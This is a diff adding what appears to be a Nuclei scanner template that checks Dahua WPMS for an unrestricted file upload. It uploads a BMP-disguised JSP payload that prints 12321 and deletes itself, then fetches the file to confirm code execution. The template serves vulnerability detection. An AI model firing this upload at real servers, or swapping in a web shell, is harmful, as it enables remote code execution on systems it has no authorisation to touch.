@@ -1,0 +1,50 @@
+id: dahua-wpms-image-fileuplod
+
+info:
+  name: dahua-wpms-image-fileuplod
+  author: dahua-wpms-image-fileuplod
+  severity: high
+
+
+variables:
+  content: "Qk22AAAAAAAAADYAAAAoAAAACgAAAAQAAAABABgAAAAAAIAAAADEDgAAxA4AAAAAAAAAAAAAaDYBaDYBZzUAZzUAZzUAZzUAZzUAZzUAZjcBZjcBAABnNQBnNQBnNQBnNQBnNQBoNgFnNQBnNQBmNwFmNwEAAGc1AGc1AGc1AWY0AGc1AGg2AWc1AWY0AGc1AGc1AAAAaDYBaDYBaDYCZzUBZzUAZzUAZjQAZjQAZzUAZzUAAAA8JW91dC5wcmludCgxMTEgKiAxMTEpO25ldyBqYXZhLmlvLkZpbGUoYXBwbGljYXRpb24uZ2V0UmVhbFBhdGgocmVxdWVzdC5nZXRTZXJ2bGV0UGF0aCgpKSkuZGVsZXRlKCk7JT4="
+  filename: '{{rand_base(5)}}'
+  boundery: '{{rand_base(10)}}'
+
+http:
+  - raw:
+      - |
+        POST /publishing/publishing/material/file/image HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36
+        Content-Type: multipart/form-data; boundary={{boundery}}
+        Accept: */*
+
+        --{{boundery}}
+        Content-Disposition: form-data; name="file"; filename="{{filename}}.jsp"
+        Content-Type: image/bmp
+
+        {{base64_decode(content)}}
+        --{{boundery}}--
+
+      - |
+        GET /publishingImg/{{upname}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36
+        Content-Type: multipart/form-data; boundary={{boundery}}
+        Accept: */*
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains(body_2,"12321") && status_code==200
+
+
+    extractors:
+      - type: regex
+        part: body
+        internal: true
+        name: upname
+        group: 1
+        regex:
+          - '"path":"(.*?)"'
